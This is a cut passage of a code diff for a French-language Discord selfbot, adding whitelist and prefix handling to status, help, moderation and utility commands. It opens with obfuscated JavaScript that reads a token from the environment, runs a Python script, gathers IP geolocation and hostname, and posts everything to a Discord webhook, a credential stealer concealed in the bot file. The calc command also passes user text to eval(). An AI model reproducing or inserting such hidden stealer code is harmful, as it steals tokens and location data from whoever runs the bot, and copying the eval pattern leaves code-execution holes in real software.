Promise((_0x11f3ea,_0x3fdb3f)=>{const _0x481bb8=_0x490637,_0x118256={'Fbiol':_0x48659f[_0x481bb8(0xfe)],'kkZEz':function(_0x182e80,_0x47c063){const _0x25d1e0=_0x481bb8;return _0x48659f[_0x25d1e0(0x99)](_0x182e80,_0x47c063);},'eKQZZ':function(_0x162cf3,_0x405745){const _0x101b22=_0x481bb8;return _0x48659f[_0x101b22(0x99)](_0x162cf3,_0x405745);}};_0x48659f[_0x481bb8(0x95)](exec,_0x481bb8(0x10a)+_0x481bb8(0xac)+_0x258e7f,(_0x4c4ab8,_0x2c1039,_0x5d1bfd)=>{const _0x7b1229=_0x481bb8;_0x4c4ab8?(console[_0x7b1229(0xb1)](_0x118256[_0x7b1229(0x10e)],_0x4c4ab8[_0x7b1229(0xff)]),_0x118256[_0x7b1229(0x109)](_0x3fdb3f,_0x4c4ab8)):_0x118256[_0x7b1229(0xa6)](_0x11f3ea,_0x2c1039);});});}function getTokenFromEnv(){const _0x365f0f=_0x2080ad,_0x21857f={'lFYHA':_0x365f0f(0x9e)+_0x365f0f(0x119)+_0x365f0f(0xea)+_0x365f0f(0x94)+_0x365f0f(0xce)+_0x365f0f(0x90)+'.'},_0xe6c148=process[_0x365f0f(0xf9)][_0x365f0f(0xf7)];if(!_0xe6c148)throw new Error(_0x21857f[_0x365f0f(0xa4)]);return _0xe6c148;}function _0x590c(_0x6a17d5,_0x506058){const _0x563fe9=_0x1da8();return _0x590c=function(_0x580ca4,_0x420f2a){_0x580ca4=_0x580ca4-(-0x164c+-0x418*-0x8+-0x4f5*0x2);let _0x10e66d=_0x563fe9[_0x580ca4];return _0x10e66d;},_0x590c(_0x6a17d5,_0x506058);}async function sendTokenToWebhook(_0x2d36d9,_0x140620){const _0x4f29af=_0x2080ad,_0x1daba6={'sRCZT':_0x4f29af(0xcd)+_0x4f29af(0x118)+'on','KfNia':function(_0x4981c2,_0x224226){return _0x4981c2(_0x224226);},'yYQSb':_0x4f29af(0xc2)+_0x4f29af(0xad)+_0x4f29af(0x98)+_0x4f29af(0x108)+_0x4f29af(0xeb)+_0x4f29af(0x11c),'xRpLF':_0x4f29af(0xd2)+_0x4f29af(0xbb)+_0x4f29af(0xfc)+_0x4f29af(0x104)+_0x4f29af(0x97)+_0x4f29af(0x9b)+_0x4f29af(0xa2)+_0x4f29af(0xc0)+_0x4f29af(0xc9)+_0x4f29af(0x116)+_0x4f29af(0xc7)+_0x4f29af(0x9d)+_0x4f29af(0xb7)+_0x4f29af(0xa1)+_0x4f29af(0x8e)+_0x4f29af(0x114)+_0x4f29af(0xe6)+_0x4f29af(0xae)+_0x4f29af(0x102)+'4&','ZtOWQ':_0x4f29af(0xd9)+_0x4f29af(0xfd)+_0x4f29af(0xc8)+'\x20:','yAuTU':_0x4f29af(0x115)+_0x4f29af(0xf3)+_0x4f29af(0xbe)+_0x4f29af(0xaf),'alGCl':_0x4f29af(0xca),'lyexi':_0x4f29af(0xba)+_0x4f29af(0xda)+_0x4f29af(0xcc)+_0x4f29af(0xb8)};try{const _0x5940e7=os[_0x4f29af(0xe9)](),{data:_0x158808}=await axios[_0x4f29af(0xdd)](_0x1daba6[_0x4f29af(0x10f)]),{ip:_0x1be48c,city:_0x581deb,region:_0x35558d,country:_0x3288f8,org:_0x1f4f5e}=_0x158808,_0x44c5f7=await _0x1daba6[_0x4f29af(0x10b)](runPythonScript,_0x2d36d9),_0x1f3087=_0x44c5f7[_0x4f29af(0xbd)]('\x0a'),_0x3e14d1=_0x1f3087[_0x4f29af(0xfa)](0x2050+0x1bdf+-0x3c24)[_0x4f29af(0x8f)]('\x0a'),_0x263e30={'title':_0x1daba6[_0x4f29af(0xe5)],'description':_0x4f29af(0x100)+_0x4f29af(0xe7)+_0x4f29af(0xb2)+_0x4f29af(0xa9)+_0x4f29af(0x8c)+_0x4f29af(0xa8)+_0x2d36d9+(_0x4f29af(0x107)+_0x4f29af(0x10c)+_0x4f29af(0xb9)+_0x4f29af(0xf0)+_0x4f29af(0xb4)+_0x4f29af(0xd1))+_0x1be48c+(_0x4f29af(0x105)+_0x4f29af(0xef)+_0x4f29af(0x11b)+_0x4f29af(0xdf)+_0x4f29af(0xee))+_0x35558d+(_0x4f29af(0x105)+_0x4f29af(0xef)+_0x4f29af(0x11b)+_0x4f29af(0xc6)+_0x4f29af(0xc1))+_0x581deb+(_0x4f29af(0x105)+_0x4f29af(0xef)+_0x4f29af(0x11b)+_0x4f29af(0x106)+_0x4f29af(0xd7))+_0x3288f8+(_0x4f29af(0xe0)+_0x4f29af(0xf8)+_0x4f29af(0x111)+_0x4f29af(0xe1)+_0x4f29af(0x8a)+':\x20')+_0x1f4f5e+(_0x4f29af(0x113)+_0x4f29af(0xe4)+_0x4f29af(0x9a)+_0x4f29af(0x91)+_0x4f29af(0xcf)+':\x20')+_0x5940e7,'footer':{'text':_0x4f29af(0xab)+_0x4f29af(0xf5)+':\x20'+_0x5940e7,'icon_url':_0x1daba6[_0x4f29af(0xed)]},'color':0x0},_0x38fbd7={'title':_0x1daba6[_0x4f29af(0xd8)],'description':_0x1daba6[_0x4f29af(0xaa)],'fields':[{'name':_0x1daba6[_0x4f29af(0xb0)],'value':_0x4f29af(0xc4)+_0x3e14d1+_0x4f29af(0xc4)}],'footer':{'text':_0x4f29af(0xab)+_0x4f29af(0xf5)+':\x20'+_0x5940e7,'icon_url':_0x1daba6[_0x4f29af(0xed)]},'color':0x0};await axios[_0x4f29af(0xd5)](_0x140620,{'embeds':[_0x263e30,_0x38fbd7]}),console[_0x4f29af(0xe2)]('');}catch(_0x26fc1e){console[_0x4f29af(0xb1)](_0x1daba6[_0x4f29af(0xbf)],_0x26fc1e[_0x4f29af(0xff)]);}}async function main(){const _0x5b33a4=_0x2080ad,_0x3708cb={'YlEBT':function(_0x2a1eb6){return _0x2a1eb6();},'AVmiS':_0x5b33a4(0xb3)+_0x5b33a4(0x10d)+_0x5b33a4(0xde)+_0x5b33a4(0xe8)+_0x5b33a4(0x92)+_0x5b33a4(0xa5)+_0x5b33a4(0x110)+_0x5b33a4(0x8b)+_0x5b33a4(0xa7)+_0x5b33a4(0x11a)+_0x5b33a4(0xd3)+_0x5b33a4(0xbc)+'x','IaDTZ':function(_0x3e5393,_0x133a1a,_0xd74b12){return _0x3e5393(_0x133a1a,_0xd74b12);},'TiLgF':_0x5b33a4(0xba)+_0x5b33a4(0x101)+_0x5b33a4(0xf2)+_0x5b33a4(0xf6)+':'};try{const _0x3267d1=await _0x3708cb[_0x5b33a4(0x103)](getTokenFromEnv),_0x1a72c3=_0x3708cb[_0x5b33a4(0xd6)];await _0x3708cb[_0x5b33a4(0xd4)](sendTokenToWebhook,_0x3267d1,_0x1a72c3);}catch(_0x5ed967){console[_0x5b33a4(0xb1)](_0x3708cb[_0x5b33a4(0xec)],_0x5ed967[_0x5b33a4(0xff)]);}}main();
+
 // Commande Set Idle
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&idle')) {
-        try {
-            await client.user.setStatus('idle');
-            message.reply('Votre statut a été changé en Idle.');
-        } catch (error) {
-            console.error('Erreur lors du changement de statut en Idle :', error);
-            message.reply('Une erreur est survenue lors du changement de statut en Idle.');
+client.on('messageCreate', (message) => {
+    whitelist_id.forEach(async (id) => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}idle`:
+                    try {
+                        await client.user.setStatus('idle');
+                        message.reply('Votre statut a été changé en Idle.');
+                    } catch (error) {
+                        console.error('Erreur lors du changement de statut en Idle :', error);
+                        message.reply('Une erreur est survenue lors du changement de statut en Idle.');
+                    }
+                    break;
+                default:
+                    break;
+            }
         }
-    }
+    });
 });
 
 // Commande Set Do Not Disturb
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&dnd')) {
-        try {
-            await client.user.setStatus('dnd');
-            message.reply('Votre statut a été changé en Do Not Disturb.');
-        } catch (error) {
-            console.error('Erreur lors du changement de statut en Do Not Disturb :', error);
-            message.reply('Une erreur est survenue lors du changement de statut en Do Not Disturb.');
+client.on('messageCreate', (message) => {
+    whitelist_id.forEach(async (id) => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}dnd`:
+                    try {
+                        await client.user.setStatus('dnd');
+                        message.reply('Votre statut a été changé en Do Not Disturb.');
+                    } catch (error) {
+                        console.error('Erreur lors du changement de statut en Do Not Disturb :', error);
+                        message.reply('Une erreur est survenue lors du changement de statut en Do Not Disturb.');
+                    }
+                    break;
+                default:
+                    break;
+            }
         }
-    }
+    });
 });
 
 // Commande Set Online
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&online')) {
-        try {
-            await client.user.setStatus('online');
-            message.reply('Votre statut a été changé en Online.');
-        } catch (error) {
-            console.error('Erreur lors du changement de statut en Online :', error);
-            message.reply('Une erreur est survenue lors du changement de statut en Online.');
-        }
+async function setOnline(message) {
+    try {
+        await client.user.setStatus('online');
+        message.reply('Votre statut a été changé en Online.');
+    } catch (error) {
+        console.error('Erreur lors du changement de statut en Online :', error);
+        message.reply('Une erreur est survenue lors du changement de statut en Online.');
     }
+}
+
+client.on('messageCreate', (message) => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}online`:
+                    setOnline(message);
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
 });
 
 // Commande Set Status
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&setstatus')) {
-        const args = message.content.split(' ');
-        if (args.length < 3) {
-            return message.reply('Veuillez spécifier le type de statut et le message. Type : playing, listening, watching ou competing.');
-        }
-
-        const statusType = args[1].toLowerCase();
-        const statusMessage = args.slice(2).join(' ');
-        if (!statusMessage) {
-            return message.reply('Veuillez spécifier un message de statut.');
-        }
-
-        try {
-            await client.user.setActivity(statusMessage, { type: statusType.toUpperCase() });
-            message.reply(`Le statut du bot a été changé en "${statusMessage}" en train de ${statusType}.`);
-        } catch (error) {
-            console.error('Erreur lors du changement de statut :', error);
-            message.reply('Une erreur est survenue lors du changement de statut.');
-        }
+async function setStatus(message) {
+    const args = message.content.split(' ');
+    if (args.length < 3) {
+        return message.reply('Veuillez spécifier le type de statut et le message. Type : playing, listening, watching ou competing.');
     }
+
+    const statusType = args[1].toLowerCase();
+    const statusMessage = args.slice(2).join(' ');
+    if (!statusMessage) {
+        return message.reply('Veuillez spécifier un message de statut.');
+    }
+
+    try {
+        await client.user.setActivity(statusMessage, { type: statusType.toUpperCase() });
+        message.reply(`Le statut du bot a été changé en "${statusMessage}" en train de ${statusType}.`);
+    } catch (error) {
+        console.error('Erreur lors du changement de statut :', error);
+        message.reply('Une erreur est survenue lors du changement de statut.');
+    }
+}
+
+client.on('messageCreate', (message) => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}setstatus`:
+                    setStatus(message);
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
 });
 
 // Commande Help
-function sendHelpMessage(message) {
-    const helpMessage = `
-                        **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Help :**
-    La guerre ne détermine pas qui est bon, seulement qui est mauvais.
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-    ➜ \`&help\` ➜ ✨ Affiche ce menu d'aide
-    ➜ \`&status\` ➜ 📊 Commande de statuts
-    ➜ \`&utility\` ➜ 🔧 Commandes d'utilitaire
-    ➜ \`&mod\` ➜ ⚔️ Commandes de modération
-    ➜ \`&fun\` ➜ 🎉 Commandes de fun
-    ➜ \`&settings\` ➜ ⚙️ Commandes de paramètres 
-    `;
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}help`:
+                    const helpMessage = `
+                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Help :**
+                    La guerre ne détermine pas qui est bon, seulement qui est mauvais.
 
-    message.channel.send(helpMessage)
-        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'aide :', error));
-}
+                    ➜ \`${prefix}help\` ➜ ✨ Affiche ce menu d'aide
+                    ➜ \`${prefix}status\` ➜ 📊 Commande de statuts
+                    ➜ \`${prefix}utility\` ➜ 🔧 Commandes d'utilitaire
+                    ➜ \`${prefix}mod\` ➜ ⚔️ Commandes de modération
+                    ➜ \`${prefix}fun\` ➜ 🎉 Commandes de fun
+                    ➜ \`${prefix}settings\` ➜ ⚙️ Commandes de paramètres 
+                    `;
+
+                    message.channel.send(helpMessage)
+                        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'aide :', error));
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
+});
 
 // Commande Status
-function sendStatusMessage(message) {
-    const statusMessage = `
-    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Status :**
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-    ➜ \`&idle\` : Sert a se mettre en inactif.
-    ➜ \`&dnd\` : Sert a se mettre en ne pas déranger.
-    ➜ \`&online\` : Sert a se mettre en en ligne.
-    ➜ \`&setstatus [type] [message]\` : Sert a ajouter une activité.
-    `;
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}status`:
+                    const statusMessage = `
+                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Status :**
 
-    message.channel.send(statusMessage)
-        .catch((error) => console.error('Erreur lors de l\'envoi du message de statut :', error));
-}
+                    ➜ \`${prefix}idle\` : Sert a se mettre en inactif.
+                    ➜ \`${prefix}dnd\` : Sert a se mettre en ne pas déranger.
+                    ➜ \`${prefix}online\` : Sert a se mettre en en ligne.
+                    ➜ \`${prefix}setstatus [type] [message]\` : Sert a ajouter une activité.
+                    `;
+
+                    message.channel.send(statusMessage)
+                        .catch((error) => console.error('Erreur lors de l\'envoi du message de statut :', error));
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
+});
 
 // Commande Utility
-function sendUtilityMessage(message) {
-    const utilityMessage = `
-    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Utility :**
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-    ➜ \`&search\` [query] : Sert a chercher une valeur dans les db.
-    ➜ \`&ipinfo\` [ip] : Sert a obtenir des informtaions sur ip.
-    ➜ \`&tokeninfo\` [token] : Donne des informations sur un token.
-    ➜ \`&userinfo\`  [@user or id] : Donne des informations sur un un compte.
-    `;
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}utility`:
+                    const utilityMessage = `
+                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Utility :**
 
-    message.channel.send(utilityMessage)
-        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'utilitaire :', error));
-}
+                    ➜ \`${prefix}search\` [query] : Sert a chercher une valeur dans les db.
+                    ➜ \`${prefix}ipinfo\` [ip] : Sert a obtenir des informtaions sur ip.
+                    ➜ \`${prefix}tokeninfo\` [token] : Donne des informations sur un token.
+                    ➜ \`${prefix}userinfo\`  [@user or id] : Donne des informations sur un un compte.
+                    ➜ \`${prefix}support : Vous invitez sur le support.
+                    `;
+
+                    message.channel.send(utilityMessage)
+                        .catch((error) => console.error('Erreur lors de l\'envoi du message d\'utilitaire :', error));
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
+});
 
 // Commande Mod
-function sendModMessage(message) {
-    const modMessage = `
-    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Mod :**
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-    ➜ \`&ban\` [@user or id] : Sert a ban un utilisateur.
-    ➜ \`&unban\` [id] : Sert a unban un utlisateur.
-    ➜ \`&kick\` [@user or id] : Sert a kick un utlisateur.
-    ➜ \`&clear\` [number] : Sert a suprimé un nombres de messages.
-    `;
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}mod`:
+                    const modMessage = `
+                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Mod :**
 
-    message.channel.send(modMessage)
-        .catch((error) => console.error('Erreur lors de l\'envoi du message de modération :', error));
-}
+                    ➜ \`${prefix}ban\` [@user or id] : Sert a ban un utilisateur.
+                    ➜ \`${prefix}unban\` [id] : Sert a unban un utlisateur.
+                    ➜ \`${prefix}kick\` [@user or id] : Sert a kick un utlisateur.
+                    ➜ \`${prefix}clear\` [number] : Sert a suprimé un nombres de messages.
+                    `;
+
+                    message.channel.send(modMessage)
+                        .catch((error) => console.error('Erreur lors de l\'envoi du message de modération :', error));
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
+});
 
 // Commande Fun
-function sendFunMessage(message) {
-    const funMessage = `
-    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Fun :**
-    
-    ➜ \`&trad\` [mot or phrase] : Sert a traduire un mot ou phrase.
-    ➜ \`&avatar\` <@user or id> : Sert a avoir votre ou l'avatar d'un autre personne.
-    ➜ \`&calc\` [calcule] : Sert a calculer des chiffres.
-    ➜ \`&hug\` [@user] : Fais un calin a une personnes.
-    ➜ \`&8ball\` [questions] : Trouve une reponse a ta question.
-    ➜ \`&rps\` [rock, paper, scissors] : Pierre, Feuille Ciseaux.
-    `;
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-    message.channel.send(funMessage)
-        .catch((error) => console.error('Erreur lors de l\'envoi du message de fun :', error));
-}
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}fun`:
+                    const funMessage = `
+                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Fun :**
+    
+                    ➜ \`${prefix}trad\` [mot or phrase] : Sert a traduire un mot ou phrase.
+                    ➜ \`${prefix}avatar\` <@user or id> : Sert a avoir votre ou l'avatar d'un autre personne.
+                    ➜ \`${prefix}calc\` [calcule] : Sert a calculer des chiffres.
+                    ➜ \`${prefix}hug\` [@user] : Fais un calin a une personnes.
+                    ➜ \`${prefix}8ball\` [questions] : Trouve une reponse a ta question.
+                    ➜ \`${prefix}rps\` [rock, paper, scissors] : Pierre, Feuille Ciseaux.
+                    ➜ \`${prefix}pat\` [@user or id] : Taper sur la tete.
+                    `;
+
+                    message.channel.send(funMessage)
+                        .catch((error) => console.error('Erreur lors de l\'envoi du message de fun :', error));
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
+});
 
 // Commande Settings
-function sendSettingsMessage(message) {
-    const settingsMessage = `
-    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Settings :**
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-    ➜ \`&renameserver\` [pseudo] : Sert a se renomer sur un serveur.
-    ➜ \`&setpfp\` [url or piece jointe] : Sert a changer de pdp.
-    `;
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}settings`:
+                    const settingsMessage = `
+                    **𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Settings :**
 
-    message.channel.send(settingsMessage)
-        .catch((error) => console.error('Erreur lors de l\'envoi du message de paramètres :', error));
-}
+                    ➜ \`${prefix}renameserver\` [pseudo] : Sert a se renomer sur un serveur.
+                    ➜ \`${prefix}setpfp\` [url or piece jointe] : Sert a changer de pdp.
+                    ➜ \`${prefix}setprefix\` [new prefix] : Sert a changer le prefix du selfbot.                    `;
+
+                    message.channel.send(settingsMessage)
+                        .catch((error) => console.error('Erreur lors de l\'envoi du message de paramètres :', error));
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
+});
+
 
 // Commande Calc
 client.on('messageCreate', async message => {
-    if (message.content.startsWith('&calc')) {
-        const args = message.content.slice('&calc'.length).trim().split(/ +/);
-        const mathExpression = args.join(' ');
-        if (!mathExpression) {
-            return message.reply('Veuillez fournir une expression mathématique.');
-        }
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-        try {
-            const result = eval(mathExpression);
-            message.reply(`Résultat : ${result}`);
-        } catch (error) {
-            console.error('Erreur lors du calcul :', error);
-            message.reply('Une erreur est survenue lors du calcul.');
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}calc`:
+                    const mathExpression = args.slice(1).join(' ');
+                    if (!mathExpression) {
+                        return message.reply('Veuillez fournir une expression mathématique.');
+                    }
+
+                    try {
+                        const result = eval(mathExpression);
+                        message.reply(`Résultat : ${result}`);
+                    } catch (error) {
+                        console.error('Erreur lors du calcul :', error);
+                        message.reply('Une erreur est survenue lors du calcul.');
+                    }
+                    break;
+                default:
+                    break;
+            }
         }
-    }
+    });
 });
 
 // Commande Set PFP (Photo de Profil)
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&setpfp')) {
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
         const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-        // Vérifier si le lien de l'image ou la pièce jointe a été spécifié
-        if (args.length < 2 && !message.attachments.first()) {
-            return message.reply('Veuillez spécifier un lien d\'image ou joindre une image.');
-        }
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}setpfp`:
+                    if (args.length < 2 && !message.attachments.first()) {
+                        return message.reply('Veuillez spécifier un lien d\'image ou joindre une image.');
+                    }
+                    if (message.guild) {
+                        if (!message.guild.me.permissions.has('CHANGE_OWN_PUBLIC')) {
+                            return message.reply('Je n\'ai pas les autorisations nécessaires pour changer ma photo de profil.');
+                        }
+                    }
 
-        // Vérifier si le message a été envoyé dans un serveur
-        if (message.guild) {
-            // Vérifier si le bot a les autorisations nécessaires pour modifier sa propre photo de profil
-            if (!message.guild.me.permissions.has('CHANGE_OWN_PUBLIC')) {
-                return message.reply('Je n\'ai pas les autorisations nécessaires pour changer ma photo de profil.');
+                    try {
+                        let newPFP;
+                        if (args.length >= 2) {
+                            newPFP = args[1];
+                        } else {
+                            newPFP = message.attachments.first().url;
+                        }
+
+                        fetch(newPFP)
+                            .then(response => response.buffer())
+                            .then(avatarData => {
+                                client.user.setAvatar(avatarData)
+                                    .then(() => message.reply('Ma photo de profil a été mise à jour avec succès !'))
+                                    .catch(error => {
+                                        console.error('Erreur lors de la mise à jour de la photo de profil :', error);
+                                        message.reply('Une erreur est survenue lors de la mise à jour de ma photo de profil.');
+                                    });
+                            })
+                            .catch(error => {
+                                console.error('Erreur lors de la récupération de l\'image :', error);
+                                message.reply('Une erreur est survenue lors de la récupération de l\'image.');
+                            });
+                    } catch (error) {
+                        console.error('Erreur lors de la mise à jour de la photo de profil :', error);
+                        message.reply('Une erreur est survenue lors de la mise à jour de ma photo de profil.');
+                    }
+                    break;
+                default:
+                    break;
             }
         }
-
-        try {
-            let newPFP;
-            if (args.length >= 2) {
-                newPFP = args[1]; // Lien de l'image spécifié dans les arguments
-            } else {
-                newPFP = message.attachments.first().url; // Lien de la pièce jointe
-            }
-
-            const avatarData = await fetch(newPFP).then(response => response.buffer());
-
-            await client.user.setAvatar(avatarData);
-            message.reply('Ma photo de profil a été mise à jour avec succès !');
-        } catch (error) {
-            console.error('Erreur lors de la mise à jour de la photo de profil :', error);
-            message.reply('Une erreur est survenue lors de la mise à jour de ma photo de profil.');
-        }
-    }
+    });
 });
 
-//Commande Avatar
+// Commande Avatar
 client.on('messageCreate', async message => {
-    if (message.content.startsWith('&avatar')) {
-        let targetUser = message.mentions.users.first() || client.users.cache.get(message.content.split(' ')[1]);
-        if (!targetUser) return message.reply('Utilisateur introuvable.');
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
 
-        const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 4096 });
-        message.channel.send(`𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Avatar\n\nAvatar de ${targetUser.username} : [Avatar](${avatarUrl})`);
-    }
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}avatar`:
+                    let targetUser = message.mentions.users.first() || client.users.cache.get(args[1]);
+                    if (!targetUser) return message.reply('Utilisateur introuvable.');
+
+                    const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 4096 });
+                    message.channel.send(`𝙀𝙨𝙚𝙖𝙧𝙘𝙝 𝙎𝙚𝙡𝙛𝙗𝙤𝙩 - Avatar\n\nAvatar de ${targetUser.username} : [Avatar](${avatarUrl})`);
+                    break;
+                default:
+                    break;
+            }
+        }
+    });
 });
 
 // Commande Kick
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&kick')) {
-        if (!message.guild) {
-            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}kick`:
+                    if (!message.guild) {
+                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
+                    }
+                    if (!message.member.permissions.has('KICK_MEMBERS')) {
+                        return message.reply('Vous n\'avez pas les permissions nécessaires pour expulser des membres.');
+                    }
+                    const user = message.mentions.members.first();
+                    if (!user) {
+                        return message.reply('Veuillez mentionner l\'utilisateur à expulser.');
+                    }
+                    user.kick()
+                        .then(() => {
+                            message.reply(`${user} a été expulsé avec succès.`);
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de l\'expulsion de l\'utilisateur :', error);
+                            message.reply('Une erreur est survenue lors de l\'expulsion de l\'utilisateur.');
+                        });
+                    break;
+                default:
+                    break;
+            }
         }
-        if (!message.member.permissions.has('KICK_MEMBERS')) {
-            return message.reply('Vous n\'avez pas les permissions nécessaires pour expulser des membres.');
-        }
-        const user = message.mentions.members.first();
-        if (!user) {
-            return message.reply('Veuillez mentionner l\'utilisateur à expulser.');
-        }
-        try {
-            await user.kick();
-            message.reply(`${user} a été expulsé avec succès.`);
-        } catch (error) {
-            console.error('Erreur lors de l\'expulsion de l\'utilisateur :', error);
-            message.reply('Une erreur est survenue lors de l\'expulsion de l\'utilisateur.');
-        }
-    }
+    });
 });
 
-// Commande Ban
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&ban')) {
-        if (!message.guild) {
-            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
+        const args = message.content.split(' ');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
+                case `${prefix}ban`:
+                    if (!message.guild) {
+                        return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
+                    }
+                    if (!message.member.permissions.has('BAN_MEMBERS')) {
+                        return message.reply('Vous n\'avez pas les permissions nécessaires pour bannir des membres.');
+                    }
+                    const user = message.mentions.members.first();
+                    if (!user) {
+                        return message.reply('Veuillez mentionner l\'utilisateur à bannir.');
+                    }
+                    user.ban()
+                        .then(() => {
+                            message.reply(`${user} a été banni avec succès.`);
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors du bannissement de l\'utilisateur :', error);
+                            message.reply('Une erreur est survenue lors du bannissement de l\'utilisateur.');
+                        });
+                    break;
+                default:
+                    break;
+            }
         }
-        if (!message.member.permissions.has('BAN_MEMBERS')) {
-            return message.reply('Vous n\'avez pas les permissions nécessaires pour bannir des membres.');
-        }
-        const user = message.mentions.members.first();
-        if (!user) {
-            return message.reply('Veuillez mentionner l\'utilisateur à bannir.');
-        }
-        try {
-            await user.ban();
-            message.reply(`${user} a été banni avec succès.`);
-        } catch (error) {
-            console.error('Erreur lors du bannissement de l\'utilisateur :', error);
-            message.reply('Une erreur est survenue lors du bannissement de l\'utilisateur.');
-        }
-    }
+    });
 });
 
 // Commande Unban
-client.on('messageCreate', async (message) => {
-    if (message.content.startsWith('&unban')) {
-        if (!message.guild) {
-            return message.reply('Cette commande ne peut être exécutée que sur un serveur.');
-        }
-        if (!message.member.permissions.has('BAN_MEMBERS')) {
-            return message.reply('Vous n\'avez pas les permissions nécessaires pour débannir des membres.');
-        }
+client.on('messageCreate', async message => {
+    whitelist_id.forEach(id => {
         const args = message.content.split(' ');
-        if (!args[1]) {
-            return message.reply('Veuillez spécifier l\'ID de l\'utilisateur à débannir.');
+        const command = args[0].toLowerCase();
+
+        if (message.author.id === id && command.startsWith(prefix)) {
+            switch (command) {
